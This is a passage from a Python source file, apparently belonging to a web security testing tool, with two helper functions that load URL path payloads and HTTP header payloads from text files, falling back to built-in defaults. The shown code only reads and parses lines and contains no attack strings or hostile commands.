# Payload / header loaders
# ──────────────────────────────────────────────────────────────────────────
def load_payloads(file_path: str, fallback: list) -> list:
    """
    Load URL path payloads from file. Falls back to built-in defaults
    if the file is missing or empty.
    """
    if os.path.isfile(file_path):
        try:
            with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                lines = [l.strip() for l in f if l.strip() and not l.strip().startswith("#")]
            if lines:
                return lines
        except Exception as e:
            log(f"[yellow][!] Could not read {file_path}: {e}[/yellow]")
    return fallback


def load_headers(file_path: str, fallback: list) -> list:
    """
    Load header payloads from file as 'Header: Value' lines and parse
    them into (name, value) tuples. Falls back to built-in defaults.
    """
    raw_lines = fallback
    if os.path.isfile(file_path):
        try:
            with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                lines = [l.strip() for l in f if l.strip() and not l.strip().startswith("#")]
            if lines:
                raw_lines = lines
        except Exception as e:
            log(f"[yellow][!] Could not read {file_path}: {e}[/yellow]")

    parsed = []
    for line in raw_lines:
        if ":" in line:
            name, value = line.split(":", 1)
            parsed.append((name.strip(), value.strip()))
    return parsed


